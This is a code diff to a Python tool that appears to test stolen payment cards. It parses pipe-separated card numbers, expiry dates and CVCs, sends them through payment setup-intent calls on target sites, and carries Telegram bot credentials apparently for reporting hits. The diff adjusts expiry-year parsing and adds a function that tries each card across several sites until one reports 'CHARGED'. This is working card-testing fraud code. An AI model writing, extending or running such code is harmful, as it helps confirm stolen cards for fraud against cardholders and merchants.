@@ -57,7 +57,8 @@ def process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, 
 
     try:
         number, exp_month, exp_year, cvc = card_data.split('|')
-        exp_year = exp_year[-2:]
+        if len(exp_year) == 4:
+            exp_year = exp_year[-2:]
     except Exception:
         msg = f"Invalid format: {card_data}"
         logger.error(msg)
@@ -137,3 +138,10 @@ def process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, 
         msg = f"Setup intent error for {card_data}: {e}"
         logger.error(msg)
         return "DECLINED", msg, card_data
+
+def check_card_across_sites(card_data, headers, uuids, chat_id, bot_token, sites):
+    for idx, site_url in enumerate(sites, start=1):
+        status, msg, raw = process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, site_url)
+        if status == "CHARGED":
+            return status, f"{msg}\nSite: {idx}", raw
+    return "DECLINED", f"Declined on all sites: {card_data}", card_data
